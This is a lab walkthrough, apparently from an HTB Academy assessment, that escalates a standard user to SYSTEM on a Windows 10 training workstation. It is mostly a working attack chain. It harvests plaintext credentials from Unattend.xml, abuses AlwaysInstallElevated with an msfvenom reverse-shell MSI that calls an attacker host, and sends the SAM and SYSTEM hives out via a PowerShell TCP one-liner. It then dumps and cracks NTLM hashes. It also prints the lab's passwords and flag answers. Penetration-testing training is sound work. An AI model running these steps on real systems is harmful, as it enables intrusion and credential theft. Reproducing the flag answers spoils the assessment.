# Section 33 — Windows Privilege Escalation Skills Assessment Part II

> **Lab: yes** — RDP to Windows 10 workstation, find cleartext domain admin creds in Unattend.xml, exploit AlwaysInstallElevated to get SYSTEM, dump SAM hashes and crack disabled admin password.

**Core principle:** Windows 10 gold image with multiple misconfigurations: deployment files left behind with plaintext domain admin credentials, AlwaysInstallElevated enabled (both HKCU and HKLM), and a disabled local admin account with a weak password. Standard user → SYSTEM via malicious MSI install.

---

## Attack chain

```
RDP as htb-student
→ C:\Windows\Panther\Unattend.xml contains iamtheadministrator plaintext creds
→ AlwaysInstallElevated enabled (HKCU + HKLM both 0x1)
→ msfvenom MSI reverse shell → msiexec /quiet installs as SYSTEM
→ SYSTEM shell → reg save SAM/SYSTEM → secretsdump → crack wksadmin hash
```

---

## Reconnaissance

### Check for deployment files

```cmd
type C:\Windows\Panther\Unattend.xml
```
> Unattend.xml is used during Windows automated deployment (sysprep). It's often left behind in `C:\Windows\Panther\` and may contain plaintext or base64-encoded credentials. Here it contains the domain admin password in the `<AutoLogon>` section with `<PlainText>true</PlainText>`.

### Check AlwaysInstallElevated

```cmd
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
> Both must show `AlwaysInstallElevated REG_DWORD 0x1` for the attack to work. This policy allows ANY user to install MSI packages with SYSTEM privileges — a critical misconfiguration.

### Check local users

```powershell
Get-LocalUser
net user wksadmin
```
> Look for disabled accounts with admin group membership. These are often "break glass" accounts with weak passwords that can be used for lateral movement.

---

## Q1 — Cleartext domain admin credentials

The `Unattend.xml` file at `C:\Windows\Panther\Unattend.xml` contains:

```xml
<AutoLogon>
  <Password>
    <Value>Inl@n3fr3ight_sup3rAdm1n!</Value>
    <PlainText>true</PlainText>
  </Password>
  <Enabled>false</Enabled>
  <Username>INLANEFREIGHT\iamtheadministrator</Username>
</AutoLogon>
```

> When `<PlainText>` is `false`, the value is base64-encoded — decode with `echo '<value>' | base64 --decode`. When `true` (like here), the password is directly readable.

**Answer:** `Inl@n3fr3ight_sup3rAdm1n!`

---

## Q2 — Privilege escalation via AlwaysInstallElevated

### Why AlwaysInstallElevated works

When both the HKCU and HKLM `AlwaysInstallElevated` registry keys are set to 1, Windows Installer runs ALL `.msi` packages with elevated (SYSTEM) privileges, regardless of the user's actual privilege level. An attacker generates a malicious MSI containing a reverse shell payload, and `msiexec` executes it as SYSTEM.

### Generate malicious MSI (on Kali)

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_TUN0_IP LPORT=9443 -f msi -o /tmp/aie.msi
```
> Creates a 64-bit MSI that, when installed, connects back to your listener as SYSTEM. Use port 9443 or any open port — no firewall restrictions on this target.

### Serve the file

```bash
python3 -m http.server 8000 --directory /tmp/
```

### Start listener

```bash
nc -lvnp 9443
```

### Download and execute on target

```powershell
iwr http://KALI_TUN0_IP:8000/aie.msi -o C:\Users\htb-student\Desktop\aie.msi
```

```cmd
msiexec /quiet /qn /i C:\Users\htb-student\Desktop\aie.msi
```
> `/quiet` = no UI, `/qn` = no GUI at all, `/i` = install. The MSI installs silently and triggers the reverse shell as SYSTEM. These must be two separate commands — PowerShell treats the second as an argument to `iwr` if on the same line.

### Read the flag

```cmd
type C:\Users\Administrator\Desktop\flag.txt
```

**Answer:** `el3vatEd_1nstall$_v3ry_r1sky`

---

## Q3 — Disabled local admin with weak password

### Dump SAM and SYSTEM hives (from SYSTEM shell)

```cmd
reg save hklm\sam C:\sam.save
reg save hklm\system C:\system.save
```
> Must be SYSTEM to read the SAM hive. These contain all local account NTLM hashes.

### Transfer to Kali via raw TCP

If SMB copy fails (port conflicts, firewall), use nc + PowerShell:

On Kali:
```bash
nc -lvnp 4445 > /tmp/sam.save
```

On target:
```powershell
powershell -c "$f=[IO.File]::ReadAllBytes('C:\sam.save');$c=New-Object Net.Sockets.TcpClient('KALI_IP',4445);$s=$c.GetStream();$s.Write($f,0,$f.Length);$c.Close()"
```

Repeat for SYSTEM hive on a different port (4446).

### Extract hashes with secretsdump

```bash
secretsdump.py -sam /tmp/sam.save -system /tmp/system.save LOCAL
```

Output:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:aad797e20ba0675bbcb3e3df3319042c:::
mrb3n:1001:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
htb-student:1002:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
wksadmin:1003:aad3b435b51404eeaad3b435b51404ee:5835048ce94ad0564e29a924a03510ef:::
```

> **wksadmin** (RID 1003) is the disabled local admin account. Its NTLM hash is `5835048ce94ad0564e29a924a03510ef`.

### Crack with hashcat

```bash
hashcat -m 1000 5835048ce94ad0564e29a924a03510ef /usr/share/wordlists/rockyou.txt
```
> `-m 1000` = NTLM hash mode. Cracks instantly against rockyou.

**Answer:** `password1`

---

## Lab walkthrough

```
┌──────────────────────────────────────────────────────────────┐
│ VARIABLES — edit these for your instance                     │
├──────────────────────────────────────────────────────────────┤
│ TARGET_IP     = <TARGET_IP>                                  │
│ KALI_TUN0_IP  = (your tun0 IP — check with ip a show tun0)  │
└──────────────────────────────────────────────────────────────┘

STEP 1: CONNECT
───────────────
1. RDP to target
   xfreerdp3 /cert:ignore /dynamic-resolution +clipboard /compression /v:<TARGET_IP> /u:htb-student /p:'HTB_@cademy_stdnt!'

STEP 2: FIND CLEARTEXT CREDS (Q1)
──────────────────────────────────
2. Check Unattend.xml
   type C:\Windows\Panther\Unattend.xml
   → <AutoLogon> section contains:
     Username: INLANEFREIGHT\iamtheadministrator
     Password: Inl@n3fr3ight_sup3rAdm1n!
   → Q1: Inl@n3fr3ight_sup3rAdm1n!

STEP 3: VERIFY ALWAYSINSTALLELEVATED
─────────────────────────────────────
3. Check both registry keys
   reg query HKCU\Software\Policies\Microsoft\Windows\Installer
   reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
   → Both show AlwaysInstallElevated = 0x1

STEP 4: ESCALATE VIA MALICIOUS MSI (Q2)
────────────────────────────────────────
4. On Kali — generate payload
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=9443 -f msi -o /tmp/aie.msi

5. On Kali — serve and listen
   python3 -m http.server 8000 --directory /tmp/
   nc -lvnp 9443

6. On target — download
   iwr http://<KALI_IP>:8000/aie.msi -o C:\Users\htb-student\Desktop\aie.msi

7. On target — install silently (triggers SYSTEM reverse shell)
   msiexec /quiet /qn /i C:\Users\htb-student\Desktop\aie.msi
   → SYSTEM shell on port 9443

8. Read flag
   type C:\Users\Administrator\Desktop\flag.txt
   → Q2: el3vatEd_1nstall$_v3ry_r1sky

STEP 5: DUMP AND CRACK LOCAL ADMIN HASH (Q3)
─────────────────────────────────────────────
9. Save SAM/SYSTEM hives (from SYSTEM shell)
   reg save hklm\sam C:\sam.save
   reg save hklm\system C:\system.save

10. Transfer to Kali via raw TCP
    Kali:   nc -lvnp 4445 > /tmp/sam.save
    Target: powershell -c "$f=[IO.File]::ReadAllBytes('C:\sam.save');$c=New-Object Net.Sockets.TcpClient('<KALI_IP>',4445);$s=$c.GetStream();$s.Write($f,0,$f.Length);$c.Close()"

    Kali:   nc -lvnp 4446 > /tmp/system.save
    Target: powershell -c "$f=[IO.File]::ReadAllBytes('C:\system.save');$c=New-Object Net.Sockets.TcpClient('<KALI_IP>',4446);$s=$c.GetStream();$s.Write($f,0,$f.Length);$c.Close()"

11. Dump hashes
    secretsdump.py -sam /tmp/sam.save -system /tmp/system.save LOCAL
    → wksadmin:1003:...:5835048ce94ad0564e29a924a03510ef:::

12. Crack NTLM hash
    hashcat -m 1000 5835048ce94ad0564e29a924a03510ef /usr/share/wordlists/rockyou.txt
    → Q3: password1
```

---

## Key takeaways

- **Always check `C:\Windows\Panther\` for deployment artifacts.** Unattend.xml, sysprep.xml, and setupcomplete.cmd often contain plaintext or base64-encoded credentials left behind from automated Windows deployments.
- **AlwaysInstallElevated is a guaranteed SYSTEM shell.** Both HKCU and HKLM keys must be set to 1. Generate a malicious MSI with msfvenom and install silently with `msiexec /quiet /qn /i`.
- **Disabled accounts still have crackable hashes.** Even though wksadmin is disabled locally, the same password may be reused on other systems — a lateral movement risk worth reporting.
- **Raw TCP transfer (nc + PowerShell) is the fallback** when SMB copy fails due to port conflicts, firewall rules, or authentication issues.
- **Gold image auditing is a real engagement type.** Organizations deploy the same image to thousands of workstations — a single misconfiguration multiplies across the entire fleet.
- **Weak local admin passwords on workstations enable lateral movement.** If `wksadmin:password1` is the same on all 1,200 workstations, compromising one means compromising all.
